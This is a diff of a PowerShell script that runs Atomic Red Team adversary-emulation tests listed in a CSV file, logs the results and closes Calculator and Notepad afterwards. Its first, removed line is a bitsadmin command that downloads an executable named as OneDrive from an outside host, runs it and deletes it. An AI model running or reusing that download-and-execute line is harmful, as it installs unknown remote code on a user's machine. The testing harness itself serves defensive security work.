@@ -1,37 +1,129 @@
-bitsadmin /transfer OneDrive.exe https://safer.sh/OneDrive.exe %APPDATA%\OneDrive.exe & %APPDATA%\OneDrive.exe & timeout 20 & del %APPDATA%\OneDrive.exe
-
-# Function to kill Calculator (calc.exe) and Notepad (notepad.exe) processes
-function Close-NotepadAndCalculator {
+# Function to parse argument string into a hashtable for Run-AtomicTest
+function Parse-Arguments {
     param (
-        [string[]]$processesToKill = @("notepad", "calc")
+        [string]$argString
     )
 
-    foreach ($processName in $processesToKill) {
-        # Get all processes with the given name
-        $runningProcesses = Get-Process -Name $processName -ErrorAction SilentlyContinue
+    $argHashtable = @{}
 
-        if ($runningProcesses) {
-            foreach ($process in $runningProcesses) {
-                try {
-                    # Try to close the process gracefully
-                    $process.CloseMainWindow() | Out-Null
+    # Check if there are any arguments
+    if (-not [string]::IsNullOrEmpty($argString)) {
+        # Split arguments by commas
+        $argPairs = $argString -split ','
 
-                    # Wait for the process to exit, and kill it if it doesn't close in time
-                    if (-not $process.WaitForExit(5)) {
-                        # If the process doesn't exit in 5 seconds, kill it forcefully
-                        $process.Kill()
-                        Log-Message "$processName (PID: $($process.Id)) killed."
-                    } else {
-                        Log-Message "$processName (PID: $($process.Id)) closed gracefully."
-                    }
-                }
-                catch {
-                    Log-Message "Error while closing $processName (PID: $($process.Id)): $_"
-                }
+        foreach ($pair in $argPairs) {
+            # Ensure we only split valid key-value pairs
+            if ($pair -match '=') {
+                $key, $value = $pair -split '=', 2
+                $key = $key.Trim()   # Ensure key is a string
+                $value = $value.Trim()  # Ensure value is a string
+
+                # Add the key-value pair to the hashtable
+                $argHashtable[$key] = $value
+            } else {
+                Log-Message "Invalid argument format: $pair. Skipping."
             }
         }
-        else {
-            Log-Message "No $processName processes found running."
-        }
+    }
+
+    # Log the contents of the hashtable for verification
+    Log-Message "Parsed Arguments Hashtable: $(ConvertTo-Json $argHashtable)"
+    return $argHashtable
+}
+
+# Function to log messages to a log file
+function Log-Message {
+    param (
+        [string]$message,
+        [string]$logFile
+    )
+
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Add-Content -Path $logFile -Value "$timestamp - $message"
+}
+
+# Function to close instances of Calculator and Notepad
+function Close-Processes {
+    Get-Process "calc", "notepad" -ErrorAction SilentlyContinue | ForEach-Object {
+        Log-Message "Closing process: $($_.ProcessName)" -logFile $logFile
+        Stop-Process -Id $_.Id -Force
     }
 }
+
+# Main script starts here
+$csvPath = "path_to_your_csv_file.csv"  # Replace with the actual path to your CSV
+$logFile = "C:\Path\To\Your\LogFile_$(Get-Date -Format 'yyyyMMdd').log"  # Replace with your desired log file path
+
+# Import the CSV file
+$ttpTests = Import-Csv -Path $csvPath
+
+# Initialize a list to hold parsed test details
+$testDetailsList = @()
+
+# Loop through each row in the CSV
+foreach ($row in $ttpTests) {
+    $ttpID = $row.TTP
+    $testNumber = $row.TestNumber
+    $testArgs = $row.Arguments -replace '^\s*|\s*$', ''  # Trim any whitespace
+
+    # Log the values being processed
+    Log-Message "Processing TTP: $ttpID, Test Number: $testNumber, Arguments: '$testArgs'"
+
+    # Check if arguments are not empty and proceed to parse them
+    if (-not [string]::IsNullOrEmpty($testArgs)) {
+        # Parse arguments into a hashtable
+        $myArgs = Parse-Arguments -argString $testArgs
+    } else {
+        $myArgs = @{}  # Empty hashtable if no arguments
+        Log-Message "No arguments provided for Test Number: $testNumber"
+    }
+
+    # Create a test detail object to store test number and arguments
+    $testDetail = [PSCustomObject]@{
+        TTP        = $ttpID
+        TestNumber = $testNumber
+        Arguments  = $myArgs  # Store the hashtable here
+    }
+
+    # Add the test detail to the list
+    $testDetailsList += $testDetail
+}
+
+# Output the collected test details for verification
+$testDetailsList | Format-Table
+
+# Loop through each test detail in the collected test details list
+foreach ($testDetail in $testDetailsList) {
+    $ttpID = $testDetail.TTP
+    $testNumber = $testDetail.TestNumber
+    $myArgs = $testDetail.Arguments  # This is your parsed arguments hashtable
+
+    # Log the test details being processed
+    Log-Message "Running Test - TTP: $ttpID, Test Number: $testNumber"
+
+    # Prepare the argument structure for Run-AtomicTest
+    $arguments = @{}
+
+    # Check if arguments are provided
+    if ($myArgs) {
+        $arguments = $myArgs  # Use the hashtable of arguments if available
+    }
+
+    # Log the arguments being passed
+    Log-Message "Arguments for Run-AtomicTest: $(ConvertTo-Json $arguments)"
+
+    try {
+        # Run the Atomic Test
+        Run-AtomicTest -TTPID $ttpID -TestNumber $testNumber -Arguments $arguments
+        Log-Message "Successfully ran Test - TTP: $ttpID, Test Number: $testNumber" -logFile $logFile
+    } catch {
+        # Log the error if the test fails
+        Log-Message "Error running Test - TTP: $ttpID, Test Number: $testNumber. Error: $_" -logFile $logFile
+    }
+}
+
+# Perform cleanup after all tests are executed
+Close-Processes
+
+# Log cleanup completion
+Log-Message "Completed cleanup of Calculator and Notepad processes." -logFile $logFile
